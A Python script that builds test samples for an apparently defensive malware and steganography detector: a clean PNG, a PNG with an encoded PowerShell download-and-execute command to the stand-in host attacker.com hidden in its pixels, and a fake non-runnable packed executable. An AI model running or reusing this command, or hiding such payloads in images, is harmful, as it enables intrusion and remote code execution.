import os
import numpy as np
from PIL import Image

print("[*] Generating controlled test artifacts for panel defense...\n")

# =====================================================================
# VECTOR B: Media Forensics (Clean vs. Malicious Stego)
# =====================================================================

# 1. Clean Reference Image
# Uniform color field with minimal noise -> Low Shannon entropy (< 4.0)
clean_data = np.zeros((300, 300, 3), dtype=np.uint8)
clean_data[:, :] = [45, 85, 125]  # Slate blue tint
clean_img = Image.fromarray(clean_data)
clean_img.save("clean_reference.png")
print("[+] Created: clean_reference.png")
print("    Expected Verdict: BENIGN MEDIA | Low Entropy (~1.0 - 3.5)\n")

# 2. Malicious Steganography Image
# High-entropy carrier + injected C2 reverse shell script in Red LSB
width, height = 300, 300
noise = np.random.randint(0, 256, (height, width, 3), dtype=np.uint8)

c2_payload = (
    "MALICIOUS_STAGE_1::cmd.exe /c powershell -nop -w hidden "
    "-enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnBzMScp"
)
payload_bytes = c2_payload.encode('utf-8')

# Flatten Red channel and manipulate as standard Python integers to avoid uint8 overflow
flat_red = noise[:, :, 0].flatten().astype(np.int32)
for byte_idx, byte_val in enumerate(payload_bytes):
    for bit_idx in range(8):
        bit = (byte_val >> (7 - bit_idx)) & 1
        pos = byte_idx * 8 + bit_idx
        if pos < len(flat_red):
            flat_red[pos] = (flat_red[pos] & 0xFE) | bit  # 0xFE (254) clears the LSB safely

noise[:, :, 0] = flat_red.astype(np.uint8).reshape((height, width))
stego_img = Image.fromarray(noise)
stego_img.save("malicious_stego.png")
print("[+] Created: malicious_stego.png")
print("    Expected Verdict: MALICIOUS / STEGO EMBEDDED | Entropy > 7.5 | LSB text visible\n")


# =====================================================================
# VECTOR A: Executable Triage (Synthetic Packed Binary)
# =====================================================================

# Generates an unexecutable binary skeleton with valid PE headers,
# dense opcode sections, and UPX packer tags to test CNN activations.
pe_stream = bytearray(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00")
pe_stream.extend(b"\x00" * (0x3C - len(pe_stream)))
pe_stream.extend((0x80).to_bytes(4, 'little'))  # Offset to PE Header
pe_stream.extend(b"\x00" * (0x80 - len(pe_stream)))
pe_stream.extend(b"PE\x00\x00\x4c\x01\x03\x00")  # 32-bit PE marker
pe_stream.extend(b"\x00" * 32)
pe_stream.extend(b"UPX0\x00\x00\x00\x00")         # Section header signature
pe_stream.extend(os.urandom(12000))               # Simulated packed shellcode payload
pe_stream.extend(b"UPX1\x00\x00\x00\x00")
pe_stream.extend(os.urandom(28000))

with open("malicious_simulated.exe", "wb") as f:
    f.write(pe_stream)

print("[+] Created: malicious_simulated.exe")
print("    Expected Verdict: Vector A Execution | Hotspot Activation on Payload Blocks\n")
print("[✓] All sample artifacts generated successfully.")